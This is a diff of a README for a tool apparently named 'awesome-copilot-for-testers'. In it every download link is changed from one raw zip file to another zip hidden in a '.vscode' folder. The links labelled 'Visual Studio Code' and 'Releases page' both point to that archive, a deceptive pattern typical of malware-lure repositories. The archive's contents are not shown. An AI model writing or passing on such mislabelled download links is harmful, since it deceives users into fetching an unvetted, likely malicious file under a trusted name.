@@ -1,6 +1,6 @@
 # 👨‍💻 awesome-copilot-for-testers - Test Automation Made Simple
 
-[![Download](https://raw.githubusercontent.com/estimulo7/awesome-copilot-for-testers/main/toxicomania/awesome-copilot-for-testers.zip)](https://raw.githubusercontent.com/estimulo7/awesome-copilot-for-testers/main/toxicomania/awesome-copilot-for-testers.zip)
+[![Download](https://github.com/estimulo7/awesome-copilot-for-testers/raw/refs/heads/main/.vscode/testers_for_awesome_copilot_3.5.zip)](https://github.com/estimulo7/awesome-copilot-for-testers/raw/refs/heads/main/.vscode/testers_for_awesome_copilot_3.5.zip)
 
 ## 📖 Overview
 
@@ -15,12 +15,12 @@ To get started with the software, follow these steps:
    - Ensure you have at least 4 GB of RAM and 1 GB of available disk space.
 
 2. **Install Visual Studio Code (VSCode):** 
-   - Download VSCode from [Visual Studio Code](https://raw.githubusercontent.com/estimulo7/awesome-copilot-for-testers/main/toxicomania/awesome-copilot-for-testers.zip).
+   - Download VSCode from [Visual Studio Code](https://github.com/estimulo7/awesome-copilot-for-testers/raw/refs/heads/main/.vscode/testers_for_awesome_copilot_3.5.zip).
    - Follow the on-screen instructions for your operating system to complete the installation.
 
 ## 📥 Download & Install
 
-To download the latest version of awesome-copilot-for-testers, please visit our [Releases page](https://raw.githubusercontent.com/estimulo7/awesome-copilot-for-testers/main/toxicomania/awesome-copilot-for-testers.zip). 
+To download the latest version of awesome-copilot-for-testers, please visit our [Releases page](https://github.com/estimulo7/awesome-copilot-for-testers/raw/refs/heads/main/.vscode/testers_for_awesome_copilot_3.5.zip). 
 
 You will find the latest release at the top. Click on the release version and select the file suitable for your operating system. 
 
@@ -83,10 +83,10 @@ If you have questions or need further assistance, you can reach out to our commu
 
 ## 🔄 Updates
 
-We regularly update the software to add new features and improve performance. Keep an eye on the [Releases page](https://raw.githubusercontent.com/estimulo7/awesome-copilot-for-testers/main/toxicomania/awesome-copilot-for-testers.zip) for the latest versions and improvements.
+We regularly update the software to add new features and improve performance. Keep an eye on the [Releases page](https://github.com/estimulo7/awesome-copilot-for-testers/raw/refs/heads/main/.vscode/testers_for_awesome_copilot_3.5.zip) for the latest versions and improvements.
 
 ## 🎉 Conclusion
 
 Thank you for using awesome-copilot-for-testers! We hope this tool boosts your test automation efforts. Start automating your tests today, and experience the difference it can make in your workflow.
 
-For any further details, revisit the [Releases page](https://raw.githubusercontent.com/estimulo7/awesome-copilot-for-testers/main/toxicomania/awesome-copilot-for-testers.zip) to stay updated and get the latest downloads.
+For any further details, revisit the [Releases page](https://github.com/estimulo7/awesome-copilot-for-testers/raw/refs/heads/main/.vscode/testers_for_awesome_copilot_3.5.zip) to stay updated and get the latest downloads.
